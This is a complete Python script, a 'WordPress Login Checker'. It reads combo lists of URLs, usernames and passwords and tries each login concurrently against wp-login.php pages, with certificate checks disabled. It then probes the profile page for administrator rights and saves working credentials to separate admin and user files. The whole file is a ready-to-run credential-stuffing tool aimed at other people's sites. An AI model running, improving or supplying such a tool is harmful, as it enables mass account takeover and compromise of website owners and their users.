import asyncio
import aiohttp
import ssl
import aiofiles
import os
from colorama import Fore, Style, init
from bs4 import BeautifulSoup

init(autoreset=True)
sem = asyncio.Semaphore(200)

BANNER = f"""
{Fore.LIGHTCYAN_EX}          O        
{Fore.LIGHTCYAN_EX}         _|_       
{Fore.LIGHTCYAN_EX}   ,_.-_' _ '_-._,   
{Fore.LIGHTCYAN_EX}    \\ (')(.)(') /    
{Fore.LIGHTCYAN_EX} _,  `\\_-===-_/`  ,_ 
{Fore.LIGHTCYAN_EX}>  |----\"\"\"\"\"----|  <  {Fore.LIGHTYELLOW_EX}WordPress Login Checker + Admin/User Filter
{Fore.LIGHTCYAN_EX}`\"\"`--/   _-@-\\--`\"\"`  {Fore.LIGHTYELLOW_EX}Output Format: url|username|password
{Fore.LIGHTCYAN_EX}     |===L_I===|         
{Fore.LIGHTCYAN_EX}      \\       /          
{Fore.LIGHTCYAN_EX}      _\\__|__/_           
{Fore.LIGHTCYAN_EX}     `\"\"\"\"`\"\"\"\"`          
"""

def parse_line(line):
    line = line.strip().replace(" # ", "#").replace(" @ ", "@")
    url, username, password = None, None, None

    if "#@" in line:
        return None

    if "#" in line and "@" in line:
        try:
            url, creds = line.split("#", 1)
            username, password = creds.split("@", 1)
        except:
            return None
    elif " " in line:
        parts = line.split()
        if len(parts) >= 3:
            url, username, password = parts[0], parts[1], " ".join(parts[2:])
    elif ":" in line:
        parts = line.split(":")
        if len(parts) >= 3:
            url, username, password = parts[0], parts[1], ":".join(parts[2:])
    elif "|" in line:
        parts = line.split("|")
        if len(parts) >= 3:
            url, username, password = parts[0], parts[1], "|".join(parts[2:])
    else:
        return None

    # Auto-fix URL
    if url:
        url = url.strip()
        if not url.startswith("http://") and not url.startswith("https://"):
            url = "https://" + url
        if "wp-login.php" not in url:
            url = url.rstrip("/") + "/wp-login.php"
    else:
        return None

    return url.strip(), username.strip(), password.strip()

async def is_wp_login_page(session, url):
    try:
        async with session.get(url, timeout=10) as resp:
            text = await resp.text()
            return 'id="loginform"' in text
    except:
        return False

async def is_admin(session, base_url):
    try:
        async with session.get(f"{base_url}/wp-admin/profile.php", timeout=10) as resp:
            text = await resp.text()
            soup = BeautifulSoup(text, "html.parser")
            roles = soup.find_all(string=lambda s: "administrator" in s.lower() or "role" in s.lower())
            return any("administrator" in r.lower() for r in roles)
    except:
        return False

async def check_wordpress(session, line):
    async with sem:
        parsed = parse_line(line)
        if not parsed:
            return f"{Fore.RED}❌ Invalid format: {line.strip()}"
        url, username, password = parsed
        try:
            if not await is_wp_login_page(session, url):
                return f"{Fore.RED}❌ Not a WordPress login page: {url}"

            payload = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': url.replace("wp-login.php", "wp-admin/"),
                'testcookie': '1'
            }

            async with session.post(url, data=payload, timeout=15, allow_redirects=True) as resp:
                text = await resp.text()
                if "wp-admin" in str(resp.url) or "dashboard" in text.lower():
                    base_url = url.split("/wp-login.php")[0]
                    admin = await is_admin(session, base_url)
                    result_line = f"{url}|{username}|{password}"
                    
                    if admin:
                        async with aiofiles.open("wp_admin.txt", "a") as f:
                            await f.write(result_line + "\n")
                        return f"{Fore.GREEN}✅ ADMIN: {result_line}"
                    else:
                        async with aiofiles.open("wp_user.txt", "a") as f:
                            await f.write(result_line + "\n")
                        return f"{Fore.CYAN}✅ USER: {result_line}"
                elif "incorrect" in text.lower():
                    return f"{Fore.RED}❌ Wrong password: {url}"
                else:
                    return f"{Fore.YELLOW}⚠️ Unknown response: {url}"
        except Exception as e:
            return f"{Fore.RED}❌ Error checking {url}: {e}"

async def process_file(session, file_path):
    print(f"\n{Fore.CYAN}📂 Scanning file: {file_path}")
    encodings = ["utf-8", "cp1252", "latin1"]
    for enc in encodings:
        try:
            async with aiofiles.open(file_path, "r", encoding=enc) as f:
                lines = await f.readlines()
            break
        except:
            continue
    else:
        print(f"{Fore.RED}❌ Failed to read: {file_path}")
        return

    tasks = [check_wordpress(session, line.strip()) for line in lines if line.strip()]
    for task in asyncio.as_completed(tasks):
        print(await task)

async def main():
    print(BANNER)
    list_dir = "list"
    os.makedirs(list_dir, exist_ok=True)

    txt_files = [os.path.join(list_dir, f) for f in os.listdir(list_dir) if f.endswith(".txt")]
    if not txt_files:
        print(f"{Fore.RED}❌ No .txt files found in folder: {list_dir}")
        return

    sslcontext = ssl.create_default_context()
    sslcontext.check_hostname = False
    sslcontext.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=sslcontext, limit=200)

    async with aiohttp.ClientSession(connector=connector) as session:
        for file_path in txt_files:
            await process_file(session, file_path)

if __name__ == "__main__":
    asyncio.run(main())
